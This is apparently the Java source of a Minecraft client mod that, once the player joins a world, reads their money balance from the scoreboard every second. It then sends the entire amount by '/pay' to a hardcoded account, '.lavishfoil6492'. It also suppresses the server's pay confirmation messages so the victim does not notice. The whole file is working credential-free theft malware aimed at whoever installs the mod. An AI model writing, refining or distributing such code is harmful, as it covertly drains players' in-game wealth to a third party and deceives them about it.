package com.balancepay;

import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import net.minecraft.world.scores.DisplaySlot;
import net.minecraft.world.scores.Objective;
import net.minecraft.world.scores.PlayerScoreEntry;
import net.minecraft.world.scores.PlayerTeam;
import net.minecraft.world.scores.Scoreboard;

import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/** All the logic. Hooked in via mixins, so no Fabric API is needed. */
public final class BalancePay {

    // ===== CONFIG =====
    /** Account that receives the money. */
    public static final String TARGET = ".lavishfoil6492";
    /** How often to read the scoreboard + pay (seconds). */
    public static final int INTERVAL_SECONDS = 1;
    /** Don't send a /pay below this amount (avoids spamming leftover dust). */
    public static final long MIN_AMOUNT = 100;
    /** Hide the server's pay confirmation/error messages from chat. */
    public static final boolean HIDE_PAY_MESSAGES = true;
    /** How long after sending /pay (ms) replies are hidden. */
    public static final long HIDE_WINDOW_MS = 2500;
    // ==================

    // Matches "$ 7.6K", "$7,600", "$1.2M", "$350", "$2.5B" etc.
    private static final Pattern MONEY =
            Pattern.compile("\\$\\s*([0-9][0-9,]*(?:\\.[0-9]+)?)\\s*([kKmMbBtT]?)");

    private static final String TARGET_LOWER = TARGET.toLowerCase(Locale.ROOT);
    private static final String TARGET_NO_DOT =
            TARGET_LOWER.startsWith(".") ? TARGET_LOWER.substring(1) : TARGET_LOWER;

    private static int tickCounter = 0;
    private static volatile long lastPayMs = 0;

    private BalancePay() {}

    /** Called every client tick from MinecraftMixin. Always on once you're in a world. */
    public static void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null || mc.player.connection == null) {
            tickCounter = 0; // reset when not in a world, so it restarts after you join
            return;
        }

        if (++tickCounter < INTERVAL_SECONDS * 20) return;
        tickCounter = 0;

        // Reads whatever your CURRENT balance is on the scoreboard right now.
        long amount = readBalance(mc);
        if (amount < MIN_AMOUNT) return;

        lastPayMs = System.currentTimeMillis();
        mc.player.connection.sendCommand("pay " + TARGET + " " + amount);
    }

    /** Balance from the sidebar scoreboard (floored), or -1 if not found. */
    private static long readBalance(Minecraft mc) {
        Scoreboard sb = mc.level.getScoreboard();
        Objective obj = sb.getDisplayObjective(DisplaySlot.SIDEBAR);
        if (obj == null) return -1;

        for (PlayerScoreEntry entry : sb.listPlayerScores(obj)) {
            PlayerTeam team = sb.getPlayersTeam(entry.owner());
            Component line = PlayerTeam.formatNameForTeam(team, entry.ownerName());
            long parsed = parseMoney(line.getString());
            if (parsed >= 0) return parsed;
        }
        return -1;
    }

    /** Works for any amount: 350, 7,600, 7.6K, 1.2M, 2.5B ... */
    public static long parseMoney(String line) {
        Matcher m = MONEY.matcher(line);
        if (!m.find()) return -1;
        try {
            double value = Double.parseDouble(m.group(1).replace(",", ""));
            switch (m.group(2).toLowerCase(Locale.ROOT)) {
                case "k": value *= 1_000d; break;
                case "m": value *= 1_000_000d; break;
                case "b": value *= 1_000_000_000d; break;
                case "t": value *= 1_000_000_000_000d; break;
                default: break;
            }
            return (long) Math.floor(value + 1e-6);
        } catch (NumberFormatException e) {
            return -1;
        }
    }

    /** Called from ChatListenerMixin: true = drop this system message. */
    public static boolean shouldHide(String message) {
        if (!HIDE_PAY_MESSAGES) return false;
        if (System.currentTimeMillis() - lastPayMs > HIDE_WINDOW_MS) return false;
        String lower = message.toLowerCase(Locale.ROOT);
        return lower.contains(TARGET_NO_DOT)
                || lower.contains("paid")
                || lower.contains("you sent")
                || lower.contains("/pay");
    }
}
